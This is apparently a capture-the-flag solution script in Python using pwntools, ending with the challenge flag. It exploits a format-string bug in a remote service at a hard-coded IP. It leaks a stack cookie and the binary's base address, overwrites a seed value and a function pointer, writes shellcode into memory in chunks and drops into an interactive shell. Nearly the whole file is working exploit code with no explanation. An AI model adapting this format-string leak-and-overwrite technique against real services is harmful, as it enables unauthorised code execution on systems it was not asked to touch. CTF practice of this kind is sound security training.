from pwn import *
from fs_lib import *

def leak(io):
    payload = "%9$p|%11$p"
    io.sendlineafter("Username: ", payload)
    io.recvuntil("Hello, ")
    output = io.recvline()
    cookie = int(output.split("|")[0], 16)
    elf    = int(output.split("|")[1], 16) - 0x1750

    return (cookie, elf)

def exploit():
    io = remote("200.136.252.34", 1245)

    cookie, elf = leak(io)

    target = elf + 0x5000
    check  = elf + 0x4028
    vault  = elf + 0x5010
    seed   = elf + 0x5008

    log.info("cookie @ {}".format(hex(cookie)))
    log.info("elf    @ {}".format(hex(elf)))
    log.info("target @ {}".format(hex(target)))
    log.info("check  @ {}".format(hex(check)))



    seed_value = 0xdcd8
    first_rand_index = 9
    fptr_value = (vault & 0xffff) + first_rand_index*8

    # homegrown format string library
    fs = FormatString(offset=24)
    # write in 1 go, will overwrite the entire seed
    fs.write(value=seed_value, step=8, addr=seed)
    # write short (hn) will only overwrite 2 bytes
    fs.write(value=fptr_value, step=2, addr=target)
    payload = fs.payload()
    
    #overwrite target and seed
    io.sendline("1")
    io.sendline(payload)
    
    #write shellcode to vault
    io.sendline("2")
    io.sendlineafter(": ", str(u64(shellcode[-8:])))
    io.sendlineafter(": ", "+") # skip scanf
    io.sendlineafter(": ", "+")
    io.sendlineafter(": ", str(u64(shellcode[-16:-8])))
    io.sendlineafter(": ", "+")
    io.sendlineafter(": ", str(u64(shellcode[:8])))
    io.sendlineafter(": ", str(u64(shellcode[8:16])))

    io.interactive()
    io.close()

exploit()
#CTF-BR{_r4nd0m_1nd1c3s_m4ke_th3_ch4ll3nge_m0r3_fun_}
